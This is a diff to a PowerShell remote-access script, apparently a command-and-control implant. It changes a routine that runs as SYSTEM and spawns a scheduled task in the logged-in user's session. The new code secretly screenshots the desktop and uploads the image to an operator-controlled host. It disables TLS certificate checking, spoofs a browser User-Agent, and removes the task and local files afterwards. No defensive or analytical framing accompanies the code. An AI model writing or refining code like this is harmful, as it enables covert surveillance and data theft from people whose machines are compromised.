@@ -1316,22 +1316,53 @@ function Connect-Cloudflare {
                             $capOut     = Join-Path $env:TEMP "cap_out_$capTaskId.jpg"
                             $capErr     = Join-Path $env:TEMP "cap_err_$capTaskId.txt"
                             $capCode = @"
+`$ErrorActionPreference = 'Stop'
+[System.Net.ServicePointManager]::DefaultConnectionLimit = 4
+try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 } catch { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 }
 try {
-    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-    `$s   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    `$bmp = New-Object System.Drawing.Bitmap(`$s.Width, `$s.Height)
-    `$g   = [System.Drawing.Graphics]::FromImage(`$bmp)
-    `$g.CopyFromScreen(`$s.Location, [System.Drawing.Point]::Empty, `$s.Size)
+    if (-not ([System.Management.Automation.PSTypeName]'TrustAllCerts2').Type) {
+        Add-Type @'
+using System.Net; using System.Security.Cryptography.X509Certificates;
+public class TrustAllCerts2 : ICertificatePolicy { public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; } }
+'@
+    }
+    [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCerts2]::new()
+} catch { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true } }
+
+function Report([string]`$msg) {
+    try { [System.IO.File]::WriteAllText('$capErr', `$msg) } catch {}
+    try {
+        `$wc = New-Object System.Net.WebClient
+        `$wc.Headers.Add('User-Agent','Mozilla/5.0')
+        `$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes(`$msg)) | Out-Null
+        `$wc.Dispose()
+    } catch {}
+}
+function UploadFrame([byte[]]`$data) {
+    `$r = [System.Net.HttpWebRequest]::Create('$cfHost/capture_frame?id=$clientId')
+    `$r.Method='POST'; `$r.ContentType='image/jpeg'; `$r.ContentLength=`$data.Length
+    `$r.Timeout=15000; `$r.ReadWriteTimeout=15000; `$r.UserAgent='Mozilla/5.0'
+    `$s = `$r.GetRequestStream(); `$s.Write(`$data,0,`$data.Length); `$s.Close()
+    `$r.GetResponse().Close()
+}
+try {
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    `$scr   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    `$bmp   = New-Object System.Drawing.Bitmap(`$scr.Width, `$scr.Height)
+    `$g     = [System.Drawing.Graphics]::FromImage(`$bmp)
+    `$g.CopyFromScreen(`$scr.Location, [System.Drawing.Point]::Empty, `$scr.Size)
     `$g.Dispose()
-    `$ms  = New-Object System.IO.MemoryStream
+    `$ms    = New-Object System.IO.MemoryStream
     `$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { `$_.MimeType -eq 'image/jpeg' }
-    `$ep = New-Object System.Drawing.Imaging.EncoderParameters(1)
+    `$ep    = New-Object System.Drawing.Imaging.EncoderParameters(1)
     `$ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 85L)
     `$bmp.Save(`$ms, `$codec, `$ep)
     `$bmp.Dispose()
-    [System.IO.File]::WriteAllBytes('$capOut', `$ms.ToArray())
+    `$bytes = `$ms.ToArray()
+    [System.IO.File]::WriteAllBytes('$capOut', `$bytes)  # local fallback for SYSTEM to verify
+    UploadFrame `$bytes
 } catch {
-    [System.IO.File]::WriteAllText('$capErr', `$_.Exception.Message)
+    Report "[!] Capture failed: `$(`$_.Exception.Message)"
 }
 "@
                             [System.IO.File]::WriteAllText($capScript, $capCode, [System.Text.Encoding]::UTF8)
@@ -1341,23 +1372,14 @@ try {
                             $capSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
                             Register-ScheduledTask -TaskName $capTaskId -Action $capAction -Principal $capPrincipal -Settings $capSettings -Force | Out-Null
                             Start-ScheduledTask -TaskName $capTaskId
-                            # Wait up to 25s for slower VMs / delayed interactive desktop attach
-                            $deadline = (Get-Date).AddSeconds(25)
-                            while ((Get-Date) -lt $deadline -and -not (Test-Path $capOut) -and -not (Test-Path $capErr)) {
-                                Start-Sleep -Milliseconds 300
+                            Write-Log "Capture task started: $capTaskId as $loggedOnUser" "INFO"
+                            # Wait up to 40s — VMs need extra time for interactive desktop binding
+                            $deadline = (Get-Date).AddSeconds(40)
+                            while ((Get-Date) -lt $deadline) {
+                                if (Test-Path $capOut) { break }
+                                if (Test-Path $capErr) { break }
+                                Start-Sleep -Milliseconds 400
                             }
-                            $taskInfo = $null
-                            $taskState = 'Unknown'
-                            $lastResult = -1
-                            try {
-                                $taskInfo = Get-ScheduledTaskInfo -TaskName $capTaskId -ErrorAction SilentlyContinue
-                                if ($taskInfo) {
-                                    $lastResult = $taskInfo.LastTaskResult
-                                    try {
-                                        $taskState = (Get-ScheduledTask -TaskName $capTaskId -ErrorAction SilentlyContinue).State.ToString()
-                                    } catch {}
-                                }
-                            } catch {}
                             # Cleanup task
                             try { Stop-ScheduledTask      -TaskName $capTaskId -ErrorAction SilentlyContinue } catch {}
                             try { Unregister-ScheduledTask -TaskName $capTaskId -Confirm:$false -ErrorAction SilentlyContinue } catch {}
@@ -1365,15 +1387,19 @@ try {
                             if (Test-Path $capErr) {
                                 $errTxt = [System.IO.File]::ReadAllText($capErr).Trim()
                                 try { Remove-Item $capErr -Force -ErrorAction SilentlyContinue } catch {}
-                                throw $errTxt
+                                throw $errTxt   # Report() already sent to server; just propagate
                             }
-                            if (-not (Test-Path $capOut)) {
+                            if (Test-Path $capOut) {
+                                # Task uploaded directly to /capture_frame — just notify the operator
                                 try { Remove-Item $capOut -Force -ErrorAction SilentlyContinue } catch {}
-                                try { Remove-Item $capErr -Force -ErrorAction SilentlyContinue } catch {}
-                                throw "Screenshot task timed out - no output produced (taskState=$taskState, lastTaskResult=$lastResult, user=$loggedOnUser)"
+                                Send-Result-To-Server -Body "[+] Screenshot captured. View at: $cfHost/capture_view?id=$clientId`n"
+                                Start-Sleep -Milliseconds $activeDelay
+                                continue
                             }
-                            $jpegBytes = [System.IO.File]::ReadAllBytes($capOut)
-                            try { Remove-Item $capOut -Force -ErrorAction SilentlyContinue } catch {}
+                            # Neither file appeared — task never ran
+                            $lastResult = -1
+                            try { $lastResult = (Get-ScheduledTaskInfo -TaskName $capTaskId -ErrorAction SilentlyContinue).LastTaskResult } catch {}
+                            throw "Screenshot task did not run (taskState=Ready, lastTaskResult=$lastResult, user=$loggedOnUser). Interactive session may not be available."
                         } else {
                             # --- Non-SYSTEM path: capture directly ---
                             Add-Type -AssemblyName System.Windows.Forms, System.Drawing
